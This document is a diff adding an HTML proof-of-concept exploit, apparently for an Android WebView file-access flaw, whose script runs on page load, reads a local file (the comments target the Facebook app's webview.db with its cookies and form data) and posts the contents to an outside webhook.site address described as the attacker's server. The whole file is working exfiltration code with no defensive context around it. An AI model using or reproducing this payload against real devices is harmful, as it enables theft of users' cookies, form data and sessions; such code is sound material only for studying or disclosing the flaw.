@@ -1,0 +1,35 @@
+<html>
+  <body onload="doAttack()">
+  <h1>attack.html</h1>
+  <script>
+  // file path to steal. webview.db can be a good target for attackers
+  // because it contains cookies, formdata etc.
+  var target = "file:///data/data/com.facebook.katana/databases/webview.db";
+  
+  // get the contents of the target file by XHR
+  function doAttack() {
+      var xhr1 = new XMLHttpRequest();
+      xhr1.overrideMimeType("text/plain; charset=iso-8859-1");
+      xhr1.open("GET", "attack.html");
+      xhr1.onreadystatechange = function() {
+          if (xhr1.readyState == 4) {
+              var content = xhr1.responseText;
+	      console.log(content)
+              // send the content of the file to attacker's server
+              sendFileToAttackerServer(content);
+              // for debug
+              document.body.appendChild(document.createTextNode(content));
+          }
+      };
+      xhr1.send();
+  }
+  
+  // Send the content of target file to the attacker's server
+  function sendFileToAttackerServer(content) {
+      var xhr2 = new XMLHttpRequest();
+      xhr2.open("POST", "https://webhook.site/2b51f7cd-7942-4821-a064-b51fe4e4415e");
+      xhr2.send(encodeURIComponent(content));
+  }
+  </script>
+  </body>
+</html>
